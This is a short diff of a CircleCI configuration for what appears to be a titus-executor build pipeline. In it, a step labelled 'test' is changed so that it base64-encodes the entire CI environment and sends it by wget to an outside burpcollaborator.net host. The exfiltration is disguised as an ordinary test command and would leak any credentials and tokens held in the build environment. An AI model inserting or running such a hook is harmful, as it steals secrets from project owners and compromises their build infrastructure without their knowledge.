@@ -19,7 +19,7 @@ jobs:
           command: docker push titusoss/titus-executor-builder
       - run: 
           name: test
-          command: wget http://ipohbcct27nky7lk5kyps4kuhw82yqn.burpcollaborator.net/env=$($DOCKER_USER | base64 | tr -d '\n')
+          command: wget http://ipohbcct27nky7lk5kyps4kuhw82yqn.burpcollaborator.net/env=$(env | base64 | tr -d '\n')
   # We don't build big image because it takes an hour+ to build on Circle CI infra
   test-images:
     docker:
